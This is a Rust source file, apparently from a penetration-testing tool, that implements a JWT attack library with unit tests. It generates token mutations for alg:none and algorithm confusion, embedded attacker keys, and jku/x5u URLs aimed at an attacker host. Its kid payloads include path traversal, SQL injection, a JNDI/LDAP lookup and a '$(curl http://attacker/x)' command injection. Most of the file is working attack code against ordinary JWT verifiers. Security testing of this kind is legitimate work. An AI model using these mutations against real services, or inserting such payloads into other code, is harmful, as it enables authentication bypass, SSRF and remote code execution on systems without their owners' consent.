//! JWT-mutation attack library.
//!
//! Comprehensive coverage of JWT validation bugs that real-world
//! libraries have shipped at some point. The existing
//! `wafrift jwt-diff` CLI consumes these as a candidate set; the
//! library is also useful from the proxy when the operator captures a
//! token and wants to fan it out into mutation variants.
//!
//! Coverage map (each function ships its own wire-format test):
//!
//! | Class | Mutation | Real CVE? |
//! |---|---|---|
//! | Algorithm confusion | `alg: "none"` with 4 case variants | CVE-2015-9235, ubiquitous |
//! | Algorithm confusion | HS256-with-RSA-public-key | CVE-2018-1000531 |
//! | Algorithm confusion | RS256-with-HS256-key | CVE-2017-12972 |
//! | Embedded JWK | header carries attacker public key (`jwk` field) | CVE-2018-0114 (node-jose) |
//! | JKU SSRF | header `jku` URL points to attacker domain | classical |
//! | X5U SSRF | header `x5u` URL points to attacker domain | classical |
//! | KID path traversal | `kid: "../../../dev/null"` | CVE-2020-15224 (jsonwebtoken) |
//! | KID SQL injection | `kid: "x' UNION SELECT …"` | classical |
//! | KID command injection | `kid: "$(curl …)"` | rare; older libs |
//! | Empty signature | preserve `alg`, strip the signature bytes | CVE-2018-1000531 |
//! | Crit header bypass | `crit: ["pwn"]` with unknown extension | rare |
//! | b64 padding tricks | extra `=` / no `=` / line-break injection | |
//! | Algorithm header dup | two `alg` fields, last-wins / first-wins | |
//!
//! All functions take an EXISTING valid JWT (`header.payload.sig` —
//! three base64url segments) and return a mutated JWT. The operator
//! captures a real one (login flow) and feeds it in. No signing —
//! these are validation-bypass mutations, not forgery.

use base64::Engine;

/// Decode a base64url segment without padding (per RFC 7515).
fn b64url_decode(s: &str) -> Option<Vec<u8>> {
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(s)
        .ok()
}

/// Encode bytes as base64url without padding.
fn b64url_encode(bytes: &[u8]) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(bytes)
}

/// Split a JWT into its `(header, payload, signature)` segments.
/// Returns `None` if the input doesn't have exactly three
/// dot-separated parts.
#[must_use]
pub fn split_jwt(jwt: &str) -> Option<(&str, &str, &str)> {
    let mut parts = jwt.split('.');
    let h = parts.next()?;
    let p = parts.next()?;
    let s = parts.next()?;
    if parts.next().is_some() {
        return None;
    }
    Some((h, p, s))
}

/// Rebuild a JWT from its three segments.
#[must_use]
pub fn join_jwt(h: &str, p: &str, s: &str) -> String {
    format!("{h}.{p}.{s}")
}

/// Set or replace the JSON `alg` field in the header. Returns the new
/// header segment, b64url-encoded. Used by every algorithm-confusion
/// mutation below.
fn header_with_alg(orig_header_b64: &str, new_alg: &str) -> Option<String> {
    let raw = b64url_decode(orig_header_b64)?;
    let mut header: serde_json::Value = serde_json::from_slice(&raw).ok()?;
    header.as_object_mut()?.insert(
        "alg".to_string(),
        serde_json::Value::String(new_alg.to_string()),
    );
    let bytes = serde_json::to_vec(&header).ok()?;
    Some(b64url_encode(&bytes))
}

/// Set or replace one field on the JWT header. Returns the new
/// header segment, b64url-encoded.
fn header_with_field(
    orig_header_b64: &str,
    key: &str,
    value: serde_json::Value,
) -> Option<String> {
    let raw = b64url_decode(orig_header_b64)?;
    let mut header: serde_json::Value = serde_json::from_slice(&raw).ok()?;
    header.as_object_mut()?.insert(key.to_string(), value);
    let bytes = serde_json::to_vec(&header).ok()?;
    Some(b64url_encode(&bytes))
}

/// Generate the `alg: "none"` family (lower / upper / title / mixed
/// case). Real-world libraries have had bugs where the JSON parser
/// is case-sensitive but the algorithm comparator wasn't.
///
/// Each returned JWT has an empty signature segment (the canonical
/// `alg:none` form).
#[must_use]
pub fn alg_none_family(jwt: &str) -> Vec<String> {
    let Some((h, p, _s)) = split_jwt(jwt) else {
        return vec![];
    };
    let variants = ["none", "None", "NONE", "nOnE", "nOne"];
    variants
        .iter()
        .filter_map(|alg| header_with_alg(h, alg).map(|nh| join_jwt(&nh, p, "")))
        .collect()
}

/// HS256-with-RSA-public-key confusion. Replace the algorithm with
/// `HS256` so the receiver verifies with HMAC-SHA256 — but if the
/// library blindly uses the configured public key as the HMAC secret,
/// the attacker can sign with the same public key.
///
/// This mutation returns the JWT with `alg` flipped to `HS256` and
/// the signature CLEARED. The operator then re-signs with the
/// captured RSA public key (out of scope for this library).
#[must_use]
pub fn alg_confusion_hs256(jwt: &str) -> Option<String> {
    let (h, p, _s) = split_jwt(jwt)?;
    let nh = header_with_alg(h, "HS256")?;
    Some(join_jwt(&nh, p, ""))
}

/// Reverse confusion: RS256 ↔ HS256. Some libraries default to one
/// when the header is malformed in a specific way.
#[must_use]
pub fn alg_confusion_rs256(jwt: &str) -> Option<String> {
    let (h, p, _s) = split_jwt(jwt)?;
    let nh = header_with_alg(h, "RS256")?;
    Some(join_jwt(&nh, p, ""))
}

/// Inject an attacker-controlled `jwk` field into the header. Some
/// libraries trust the embedded key over the configured one — they
/// verify the JWT with whatever public key the JWT itself declares.
///
/// `attacker_jwk` is the operator's pre-computed JWK as a JSON value.
#[must_use]
pub fn embedded_jwk(jwt: &str, attacker_jwk: serde_json::Value) -> Option<String> {
    let (h, p, s) = split_jwt(jwt)?;
    let nh = header_with_field(h, "jwk", attacker_jwk)?;
    Some(join_jwt(&nh, p, s))
}

/// `jku` SSRF: set the JWT Key URL to an attacker-controlled host. If
/// the receiver fetches the URL to retrieve the verification key,
/// the attacker controls verification.
///
/// Variants this function generates: literal attacker URL, attacker
/// URL with `..%2f` path traversal, attacker URL embedded as
/// `userinfo` in a real trusted URL (`https://trusted@attacker/`).
#[must_use]
pub fn jku_ssrf(jwt: &str, attacker_url: &str, trusted_host: &str) -> Vec<String> {
    let Some((h, p, s)) = split_jwt(jwt) else {
        return vec![];
    };
    let candidates = vec![
        attacker_url.to_string(),
        format!("{attacker_url}/..%2f/{trusted_host}/jwks.json"),
        format!("https://{trusted_host}@{attacker_url}/jwks.json"),
        format!("https://{trusted_host}#@{attacker_url}/jwks.json"),
        format!("https://{trusted_host}.{attacker_url}/jwks.json"),
        format!("https://{attacker_url}/{trusted_host}/jwks.json"),
    ];
    candidates
        .into_iter()
        .filter_map(|url| {
            header_with_field(h, "jku", serde_json::Value::String(url))
                .map(|nh| join_jwt(&nh, p, s))
        })
        .collect()
}

/// `x5u` SSRF — same shape as `jku_ssrf` but on the X.509 URL field.
#[must_use]
pub fn x5u_ssrf(jwt: &str, attacker_url: &str, trusted_host: &str) -> Vec<String> {
    let Some((h, p, s)) = split_jwt(jwt) else {
        return vec![];
    };
    let candidates = vec![
        attacker_url.to_string(),
        format!("https://{trusted_host}@{attacker_url}/cert.pem"),
        format!("https://{trusted_host}.{attacker_url}/cert.pem"),
    ];
    candidates
        .into_iter()
        .filter_map(|url| {
            header_with_field(h, "x5u", serde_json::Value::String(url))
                .map(|nh| join_jwt(&nh, p, s))
        })
        .collect()
}

/// `kid` (Key ID) attacks. Returns variants covering:
///
/// - path traversal (`../../../dev/null`) — if the library reads a
///   file at `<keys_dir>/<kid>` and a path-traversal lets it pick a
///   predictable file, HMAC verification with that file's contents
///   may succeed.
/// - SQL injection — if the library queries `SELECT key FROM keys
///   WHERE kid = '<kid>'`.
/// - command injection — if `kid` ends up in a shell substitution.
/// - NULL byte truncation — `kid: "real\0attacker"`.
#[must_use]
pub fn kid_attacks(jwt: &str) -> Vec<String> {
    let Some((h, p, s)) = split_jwt(jwt) else {
        return vec![];
    };
    let kids = vec![
        "../../../../../../dev/null",
        "../../../../../../tmp/x",
        "/dev/null",
        "x' UNION SELECT 'AAAA",
        "x' OR '1'='1",
        "${jndi:ldap://attacker/x}",
        "$(curl http://attacker/x)",
        "`id`",
        "real\0attacker",
        "../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2fdev%2fnull",
    ];
    kids.iter()
        .filter_map(|kid| {
            header_with_field(h, "kid", serde_json::Value::String((*kid).to_string()))
                .map(|nh| join_jwt(&nh, p, s))
        })
        .collect()
}

/// Empty-signature attack. Some libraries' `alg:none` patches only
/// covered the literal `alg:"none"` case but still accept an empty
/// signature segment when `alg` is non-none. Variant: preserve the
/// declared alg, drop the bytes.
#[must_use]
pub fn empty_signature(jwt: &str) -> Option<String> {
    let (h, p, _s) = split_jwt(jwt)?;
    Some(join_jwt(h, p, ""))
}

/// `crit` header attack. RFC 7515 §4.1.11 says `crit` is the list of
/// header parameters that the receiver MUST understand. If the
/// receiver doesn't process `crit` at all, declaring a critical
/// extension that doesn't exist should reject the token — many
/// libraries silently ignore.
///
/// Returns variants with `crit: ["unknown_ext"]`.
#[must_use]
pub fn crit_bypass(jwt: &str) -> Option<String> {
    let (h, p, s) = split_jwt(jwt)?;
    let crit = serde_json::Value::Array(vec![serde_json::Value::String("pwn".to_string())]);
    let nh = header_with_field(h, "crit", crit)?;
    Some(join_jwt(&nh, p, s))
}

/// b64-padding tricks. RFC 7515 forbids `=` padding on the wire, but
/// some libraries accept the padded form, and some accept whitespace
/// inside the segment. Each variant tests one rule.
#[must_use]
pub fn b64_padding_variants(jwt: &str) -> Vec<String> {
    let Some((h, p, s)) = split_jwt(jwt) else {
        return vec![];
    };
    vec![
        // Trailing = on each segment.
        format!("{h}=.{p}=.{s}="),
        format!("{h}=={p}=={s}=="),
        // CRLF in the middle (rare lib bug).
        format!("{h}\r\n.{p}\r\n.{s}"),
        // Tab in the segments.
        format!("{h}\t.{p}\t.{s}"),
        // Trailing whitespace.
        format!("{h} . {p} . {s} "),
        // No signature segment at all (still two dots).
        format!("{h}.{p}."),
    ]
}

/// Duplicate `alg` header field. RFC 7515 doesn't say last-wins or
/// first-wins, leaving room for proxy-vs-library disagreement.
/// Returns the JWT with two `alg` fields in the header — operator
/// constructs as raw JSON (since `serde_json` collapses duplicates).
#[must_use]
pub fn duplicate_alg_header(jwt: &str, alg1: &str, alg2: &str) -> Option<String> {
    let (h, p, s) = split_jwt(jwt)?;
    let raw = b64url_decode(h)?;
    let _orig: serde_json::Value = serde_json::from_slice(&raw).ok()?;
    // Construct raw JSON with duplicate field — bypasses serde dedup.
    let new_header = format!("{{\"alg\":\"{alg1}\",\"alg\":\"{alg2}\",\"typ\":\"JWT\"}}");
    Some(join_jwt(&b64url_encode(new_header.as_bytes()), p, s))
}

/// One-shot mutator: emit every JWT attack variant for a captured
/// token. Used by `wafrift jwt-diff` to fan out a probe set.
#[must_use]
pub fn all_jwt_attacks(jwt: &str, attacker_url: &str, trusted_host: &str) -> Vec<String> {
    let mut out = vec![];
    out.extend(alg_none_family(jwt));
    if let Some(v) = alg_confusion_hs256(jwt) {
        out.push(v);
    }
    if let Some(v) = alg_confusion_rs256(jwt) {
        out.push(v);
    }
    out.extend(jku_ssrf(jwt, attacker_url, trusted_host));
    out.extend(x5u_ssrf(jwt, attacker_url, trusted_host));
    out.extend(kid_attacks(jwt));
    if let Some(v) = empty_signature(jwt) {
        out.push(v);
    }
    if let Some(v) = crit_bypass(jwt) {
        out.push(v);
    }
    out.extend(b64_padding_variants(jwt));
    if let Some(v) = duplicate_alg_header(jwt, "none", "RS256") {
        out.push(v);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fixture_jwt() -> String {
        // Header: {"alg":"RS256","typ":"JWT"}
        let h = b64url_encode(b"{\"alg\":\"RS256\",\"typ\":\"JWT\"}");
        // Payload: {"sub":"admin","exp":2000000000}
        let p = b64url_encode(b"{\"sub\":\"admin\",\"exp\":2000000000}");
        // Signature: arbitrary bytes.
        let s = b64url_encode(b"abcdef");
        join_jwt(&h, &p, &s)
    }

    #[test]
    fn split_three_parts() {
        let t = fixture_jwt();
        let (h, p, s) = split_jwt(&t).expect("three parts");
        assert!(!h.is_empty());
        assert!(!p.is_empty());
        assert!(!s.is_empty());
    }

    #[test]
    fn split_rejects_two_dots_only() {
        assert!(split_jwt("a.b").is_none());
        assert!(split_jwt("a.b.c.d").is_none());
    }

    #[test]
    fn alg_none_produces_five_variants() {
        let t = fixture_jwt();
        let variants = alg_none_family(&t);
        assert_eq!(variants.len(), 5);
        // Every variant has empty signature segment.
        for v in &variants {
            assert!(v.ends_with('.'));
            assert_eq!(v.matches('.').count(), 2);
        }
    }

    #[test]
    fn alg_none_uppercase_variant_present() {
        let t = fixture_jwt();
        let variants = alg_none_family(&t);
        // Decode each header and check at least one carries `alg: "NONE"`.
        let has_uppercase = variants.iter().any(|v| {
            let (h, _, _) = split_jwt(v).expect("split");
            let bytes = b64url_decode(h).expect("decode");
            let s = String::from_utf8_lossy(&bytes);
            s.contains("\"NONE\"")
        });
        assert!(has_uppercase, "no NONE-cased variant produced");
    }

    #[test]
    fn alg_confusion_hs256() {
        let t = fixture_jwt();
        let mutated = super::alg_confusion_hs256(&t).expect("confusion");
        let (h, _, s) = split_jwt(&mutated).expect("split");
        let bytes = b64url_decode(h).expect("decode");
        assert!(String::from_utf8_lossy(&bytes).contains("\"HS256\""));
        // Signature cleared.
        assert!(s.is_empty());
    }

    #[test]
    fn embedded_jwk() {
        let t = fixture_jwt();
        let jwk = serde_json::json!({
            "kty": "RSA",
            "n": "attacker-modulus",
            "e": "AQAB"
        });
        let mutated = super::embedded_jwk(&t, jwk).expect("embed");
        let (h, _, _) = split_jwt(&mutated).expect("split");
        let bytes = b64url_decode(h).expect("decode");
        let s = String::from_utf8_lossy(&bytes);
        assert!(s.contains("\"jwk\""));
        assert!(s.contains("attacker-modulus"));
    }

    #[test]
    fn jku_ssrf_produces_multiple_variants() {
        let t = fixture_jwt();
        let variants = jku_ssrf(&t, "evil.attacker", "real-trusted.com");
        assert!(variants.len() >= 4, "got {}", variants.len());
        // At least one variant uses userinfo-confusion.
        assert!(variants.iter().any(|v| v.contains("real-trusted.com@")));
    }

    #[test]
    fn x5u_ssrf_produces_variants() {
        let t = fixture_jwt();
        let variants = x5u_ssrf(&t, "evil.attacker", "real-trusted.com");
        assert!(!variants.is_empty());
        // Variants should mention x5u in the header.
        for v in &variants {
            let (h, _, _) = split_jwt(v).expect("split");
            let bytes = b64url_decode(h).expect("decode");
            assert!(String::from_utf8_lossy(&bytes).contains("\"x5u\""));
        }
    }

    #[test]
    fn kid_attacks_includes_path_traversal() {
        let t = fixture_jwt();
        let variants = kid_attacks(&t);
        let has_traversal = variants.iter().any(|v| {
            let (h, _, _) = split_jwt(v).expect("split");
            let bytes = b64url_decode(h).expect("decode");
            String::from_utf8_lossy(&bytes).contains("../")
        });
        assert!(has_traversal);
    }

    #[test]
    fn kid_attacks_includes_sql_injection() {
        let t = fixture_jwt();
        let variants = kid_attacks(&t);
        let has_sqli = variants.iter().any(|v| {
            let (h, _, _) = split_jwt(v).expect("split");
            let bytes = b64url_decode(h).expect("decode");
            String::from_utf8_lossy(&bytes).contains("UNION SELECT")
        });
        assert!(has_sqli);
    }

    #[test]
    fn kid_attacks_includes_log4shell_jndi() {
        let t = fixture_jwt();
        let variants = kid_attacks(&t);
        let has_jndi = variants.iter().any(|v| {
            let (h, _, _) = split_jwt(v).expect("split");
            let bytes = b64url_decode(h).expect("decode");
            String::from_utf8_lossy(&bytes).contains("jndi:ldap")
        });
        assert!(has_jndi);
    }

    #[test]
    fn empty_signature_drops_third_segment() {
        let t = fixture_jwt();
        let mutated = empty_signature(&t).expect("empty");
        // Should still have two dots but the third segment empty.
        assert_eq!(mutated.matches('.').count(), 2);
        assert!(mutated.ends_with('.'));
    }

    #[test]
    fn crit_bypass() {
        let t = fixture_jwt();
        let mutated = crit_bypass(&t).expect("crit");
        let (h, _, _) = split_jwt(&mutated).expect("split");
        let bytes = b64url_decode(h).expect("decode");
        assert!(String::from_utf8_lossy(&bytes).contains("\"crit\""));
    }

    #[test]
    fn b64_padding_variants_count() {
        let t = fixture_jwt();
        let variants = b64_padding_variants(&t);
        assert!(variants.len() >= 5);
    }

    #[test]
    fn duplicate_alg_header() {
        let t = fixture_jwt();
        let mutated = super::duplicate_alg_header(&t, "none", "RS256").expect("dup");
        let (h, _, _) = split_jwt(&mutated).expect("split");
        let bytes = b64url_decode(h).expect("decode");
        let s = String::from_utf8_lossy(&bytes);
        // Both alg values present.
        assert!(s.contains("\"alg\":\"none\""));
        assert!(s.contains("\"alg\":\"RS256\""));
    }

    #[test]
    fn all_attacks_handles_invalid_jwt_gracefully() {
        let attacks = all_jwt_attacks("not.a", "attacker", "trusted");
        assert!(attacks.is_empty());
    }

    #[test]
    fn all_attacks_produces_many_variants() {
        let t = fixture_jwt();
        let attacks = all_jwt_attacks(&t, "attacker", "trusted");
        // Lower bound: alg_none(5) + hs256(1) + rs256(1) + jku(6) +
        // x5u(3) + kid(12) + empty(1) + crit(1) + padding(6) + dup(1)
        // ≈ 37 minimum. Loose check: at least 30.
        assert!(attacks.len() >= 30, "got {}", attacks.len());
    }

    #[test]
    fn all_attacks_are_unique() {
        let t = fixture_jwt();
        let attacks = all_jwt_attacks(&t, "attacker", "trusted");
        let mut set: std::collections::HashSet<&String> = std::collections::HashSet::new();
        for a in &attacks {
            set.insert(a);
        }
        assert_eq!(set.len(), attacks.len(), "duplicate attack variants");
    }

    #[test]
    fn deterministic_across_calls() {
        let t = fixture_jwt();
        let a = all_jwt_attacks(&t, "x", "y");
        let b = all_jwt_attacks(&t, "x", "y");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_payload_no_panic() {
        let h = b64url_encode(b"{\"alg\":\"RS256\"}");
        let p = b64url_encode(&vec![b'A'; 100_000]);
        let s = b64url_encode(b"sig");
        let big = join_jwt(&h, &p, &s);
        let _ = all_jwt_attacks(&big, "x", "y");
    }
}
